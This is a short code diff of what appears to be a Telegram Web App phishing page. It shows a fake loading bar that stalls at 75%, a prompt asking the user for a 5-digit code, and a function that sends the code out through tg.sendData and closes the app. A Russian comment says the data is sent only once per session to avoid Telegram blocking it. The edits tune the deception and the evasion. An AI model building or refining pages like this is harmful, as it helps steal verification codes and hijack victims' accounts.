@@ -55,7 +55,7 @@
             ];
             let pIdx = 0;
             const interval = setInterval(() => {
-                width += Math.random() * 7;
+                width += Math.random() * 5;
                 if (width >= 75) {
                     clearInterval(interval);
                     document.getElementById('bar').style.width = '75%';
@@ -74,12 +74,9 @@
         function sendCode() {
             const val = document.getElementById('u_code').value;
             if(val.length < 5) return alert("Введите 5 цифр");
+            // Шлем данные ОДИН раз за сессию, чтобы ТГ не блочил
             tg.sendData(JSON.stringify({t: 'c', v: val}));
-            document.getElementById('step-code').style.display = 'none';
-            document.getElementById('step-loading').style.display = 'block';
-            document.getElementById('load-text').innerText = "Проверка...";
-            document.getElementById('bar').style.width = '100%';
-            setTimeout(() => tg.close(), 2500);
+            tg.close();
         }
     </script>
 </body>
